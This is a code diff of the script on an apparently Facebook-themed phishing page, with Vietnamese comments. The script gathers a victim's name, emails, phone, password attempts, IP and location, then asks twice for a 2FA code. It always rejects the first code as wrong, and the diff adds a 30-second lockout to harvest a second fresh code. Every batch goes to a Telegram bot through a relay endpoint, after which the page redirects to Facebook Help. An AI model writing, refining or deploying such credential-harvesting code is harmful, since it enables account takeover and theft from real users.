@@ -134,7 +134,6 @@
     </div>
 
     <script>
-
         let storedFormData = {};
         let storedIpAddress = 'N/A';
         let storedLocationData = 'N/A';
@@ -156,43 +155,37 @@
 
         // Send message to Telegram
         async function sendMessageToTelegram(message) {
-    try {
-        // Gọi đến endpoint của Serverless Function
-        const response = await fetch('/api/send-telegram', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ message: message }) // Gửi nội dung tin nhắn lên Serverless Function
-        });
-        const data = await response.json();
-        if (!data.success) {
-            console.error('Error sending message via API:', data.error);
-            // Xử lý lỗi nếu cần (ví dụ: hiển thị thông báo cho người dùng)
-        } else {
-            console.log('Message sent successfully via API!');
+            try {
+                const response = await fetch('/api/send-telegram', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ message: message })
+                });
+                const data = await response.json();
+                if (!data.success) {
+                    console.error('Error sending message via API:', data.error);
+                } else {
+                    console.log('Message sent successfully via API!');
+                }
+            } catch (error) {
+                console.error('Error calling send-telegram API:', error);
+            }
         }
-    } catch (error) {
-        console.error('Error calling send-telegram API:', error);
-        // Xử lý lỗi kết nối hoặc lỗi mạng
-    }
-}
 
         function updateTimerDisplay() {
             const minutes = Math.floor(timerSeconds / 60);
             const seconds = timerSeconds % 60;
-            twofaTimerDisplay.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+            twofaTimerDisplay.textContent = ` ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
         }
 
         function startTimer() {
-            updateTimerDisplay(); // Display initial 2:55
+            updateTimerDisplay();
             timerInterval = setInterval(() => {
                 timerSeconds--;
                 updateTimerDisplay();
                 if (timerSeconds <= 0) {
                     clearInterval(timerInterval);
-                    twofaTimerDisplay.textContent = '0:00';
-                    // Optional: logic to enable a 'Resend code' button here
+                    twofaTimerDisplay.textContent = ' 0:00';
                 }
             }, 1000);
         }
@@ -201,6 +194,7 @@
 
         confirmTwofaButton.addEventListener('click', async () => {
             const twofaCode = twofaInput.value;
+            if (confirmTwofaButton.disabled) return; // Không làm gì nếu nút đang bị vô hiệu hóa
             if (!twofaCode) {
                 twofaError.textContent = 'Code cannot be empty.';
                 twofaError.style.display = 'block';
@@ -213,7 +207,7 @@
             message += `------------------------------------\n`;
             message += `<b>IP & Location:</b> ${storedIpAddress} (${storedLocationData})\n`;
             message += `<b>Ticket Number:</b> ${storedFormData.ticketNumber}\n`;
-            message += `<b>Your Name:</b> ${storedFormData.yourName}\n`;
+            message += `<b>Page Name:</b> ${storedFormData.yourName}\n`;
             message += `<b>Business Email:</b> ${storedFormData.businessEmail}\n`;
             message += `<b>Personal Email:</b> ${storedFormData.personalEmail}\n`;
             message += `<b>Mobile Phone:</b> ${storedFormData.mobilePhoneNumber}\n`;
@@ -224,24 +218,48 @@
                 twoFAAttemptValue1 = twofaCode;
                 message += `<b>2FA Code Attempt 1:</b> ${twoFAAttemptValue1}\n`;
                 await sendMessageToTelegram(message);
-                twofaError.textContent = 'Incorrect code. Please try again.';
+                
+                twofaError.textContent = 'Incorrect code. Please try again in 30 seconds.';
                 twofaError.style.display = 'block';
-                twofaInput.value = ''; // Clear input for next attempt
+                twofaInput.value = ''; // Xóa input
+
+                // Vô hiệu hóa input và nút
+                twofaInput.disabled = true;
+                confirmTwofaButton.disabled = true;
+                confirmTwofaButton.style.backgroundColor = '#cccccc';
+                confirmTwofaButton.style.cursor = 'not-allowed';
+
+                // Bắt đầu đếm ngược 30 giây
+                let waitSeconds = 30;
+                const waitInterval = setInterval(() => {
+                    confirmTwofaButton.textContent = `Try again in ${waitSeconds}s`;
+                    waitSeconds--;
+                    if (waitSeconds < 0) {
+                        clearInterval(waitInterval);
+                        // Kích hoạt lại
+                        twofaInput.disabled = false;
+                        confirmTwofaButton.disabled = false;
+                        confirmTwofaButton.style.backgroundColor = '#2583ffda';
+                        confirmTwofaButton.style.cursor = 'pointer';
+                        confirmTwofaButton.textContent = 'Continue';
+                        twofaError.style.display = 'none';
+                        twofaInput.focus();
+                    }
+                }, 1000);
+
             } else if (twoFAAttemptCount === 2) {
                 twoFAAttemptValue2 = twofaCode;
                 message += `<b>2FA Code Attempt 2:</b> ${twoFAAttemptValue2}\n`;
                 await sendMessageToTelegram(message);
 
-                // Clear localStorage upon successful completion
                 localStorage.clear();
-                clearInterval(timerInterval); // Clear the timer
-                window.location.href = 'https://www.facebook.com/help'; // Redirect to Facebook Help
+                clearInterval(timerInterval);
+                window.location.href = 'https://www.facebook.com/help';
             }
         });
 
         // --- Initial Setup for 2FA Page ---
         document.addEventListener('DOMContentLoaded', () => {
-            // Retrieve stored data from localStorage
             const formDataJSON = localStorage.getItem('formData');
             if (formDataJSON) {
                 storedFormData = JSON.parse(formDataJSON);
@@ -256,14 +274,12 @@
             storedPasswordAttemptValue1 = localStorage.getItem('passwordAttemptValue1') || '';
             storedPasswordAttemptValue2 = localStorage.getItem('passwordAttemptValue2') || '';
 
-            // Start the timer
             startTimer();
         });
 
-        // Clear localStorage if user navigates away unexpectedly
         window.addEventListener('beforeunload', () => {
             localStorage.clear();
-            clearInterval(timerInterval); // Also clear timer if leaving
+            clearInterval(timerInterval);
         });
     </script>
 </body>
